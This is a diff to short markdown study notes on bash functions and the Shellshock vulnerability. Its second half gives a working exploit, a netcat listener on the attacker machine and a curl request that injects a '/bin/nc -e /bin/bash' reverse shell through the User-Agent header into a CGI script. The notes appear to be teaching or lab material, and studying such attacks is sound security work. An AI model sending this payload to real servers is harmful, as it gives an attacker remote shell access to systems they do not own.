@@ -2,20 +2,23 @@
 
 ### Bash functions
 
-Can be defined in "one liners"
+* Can be defined in "one liners"
 
 
 ```
 $ welcome() {echo "Hi $User}
 ```
 
+Type welcome:
+
 ```
 $ welcome
 ```
 
+Output:
 > Hi user
 
-Can be defined in environment variables
+* Can be defined in environment variables
 
 
 
@@ -30,12 +33,12 @@ $bash -c 'hellofunc'
 
 ### Shellshock
 
-> env val='() { :;}; echo vulnerable' bash -c "echo test"
+> env val='() { : ;}; echo vulnerable' bash -c "echo test"
 
 
 ### Exploit Shellshock to gain a Shell
 
-#### Attacker machine
+#### Turn on a netcat listener on attacker machine
 
 
 > netcat -nlvp 443
@@ -43,11 +46,11 @@ $bash -c 'hellofunc'
 
 
 
-#### use curl send a request
+#### Use curl send a request
 
 
 
-> curl -H "user agent: () {:;};echo;/bin/nc -e /bin/bash [yourIPaddress] 443" [targetIPaddress]/cgi-bin/vulnerable.cgi
+> curl -H "user agent: () { : ;};echo;/bin/nc -e /bin/bash [yourIPaddress] 443" [targetIPaddress]/cgi-bin/vulnerable.cgi
  
 
 
